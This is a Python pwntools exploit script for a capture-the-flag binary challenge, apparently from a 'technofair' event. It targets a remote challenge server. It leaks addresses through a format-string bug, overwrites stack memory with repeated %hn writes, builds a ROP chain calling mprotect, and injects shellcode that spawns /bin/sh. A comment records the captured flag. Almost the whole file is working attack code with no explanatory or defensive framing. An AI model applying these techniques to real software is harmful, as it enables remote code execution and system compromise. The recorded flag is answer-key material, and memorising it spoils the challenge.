#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''
# b *0x555555555215
b *0x555555555226
# b *0x5555555552d0
x/10gx 0x7fffffffdc70
'''

gdbscript = '''
# b *0x5555555551ed
b *0x55555555522b

'''

HOST = '103.152.242.172'
PORT = 40904

def debug(gdbscript):
    if type(r) == process:
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        gdb.attach(r, gdbscript,aslr=0)

def fmt_str(payload):
    payload += '|\0'
    r.sendline(payload)
    return r.recv().split(b'|')[0]


def exploit(r):
    context.arch = 'amd64'

    pie = int(fmt_str("%p"), 16) - 0x4060
    libc.address = int(fmt_str("%13$p"), 16) - 0x21bf7
    stack = int(fmt_str("%15$p"), 16)

    info(f'libc.address 0x{libc.address:x}')
    info(f'pie 0x{pie:x}')
    info(f'stack 0x{stack:x}')

    what = stack
    where = (stack - 0x8) & 0xFFFF

    for off in range(3):
        r.send(f'%{where + (2 * off)}x%15$hn||')
        r.recvuntil(b'||')
        r.send(f'%{what & 0xFFFF}x%41$hn||')
        r.recvuntil(b'||')
        what = what >> 0x10

    where = ( stack - 0xf8 ) & 0xFFFF
    what = libc.address + 0x3960

    for i in range(6):
        r.send(f'%{where+i}x%36$hn||')
        r.recvuntil(b'||')
        r.send('\x00' * 0x128)
        r.send(f'%{what & 0xFF}x%40$hhn||')
        r.recvuntil(b'||')
        r.send('\x00' * 0x128)
        what = what >> 8

    rop_addr = pie + 0x40f0

    where = ( stack - 0xf0 ) & 0xFFFF
    what = rop_addr

    for i in range(8):
        r.send(f'%{where+i}x%36$hn||')
        r.recvuntil(b'||')
        r.send('\x00' * 0x128)
        if i > 5:
            r.send('%40$hn||')
        else:
            r.send(f'%{what & 0xFF}x%40$hhn||')
        r.recvuntil(b'||')
        r.send('\x00' * 0x128)
        what = what >> 8


    rop = ROP(libc)
    rop.call(libc.sym['mprotect'], [pie + 0x4000, 0x1000, 0x7])
    rop = bytes(rop)

    payload  = b'\x00' * 0x88 + b'/bin/sh\0'
    payload += rop
    payload += p64(rop_addr + len(rop) + 8)
    payload += asm(f'''
        movabs rsp, {stack}
        movabs rdi, {rop_addr - 8}
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
    ''')

    # technofair{semoga_COVID-19_segera_musnah_dari_muka_bumi_qo1v90i28efw3t71}
    r.send(payload + b'\n')
    # debug(gdbscript)
    where = ( stack - 0x100 ) & 0xFFFF
    what = pie + 0x12cc
    #36
    # print (where)
    r.send(f'%{where}x%36$hn||')
    r.recvuntil(b'||')


    # 40
    r.send(f'%{what & 0xFFFF}x%40$hn||')
    r.recvuntil(b'||')

    r.interactive()

exe = context.binary = ELF('./chall')

if __name__ == '__main__':
    elf  = ELF(PATH)
    # libc = ELF(elf.libc.path)
    libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process([exe.path], env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"})
    exploit(r)
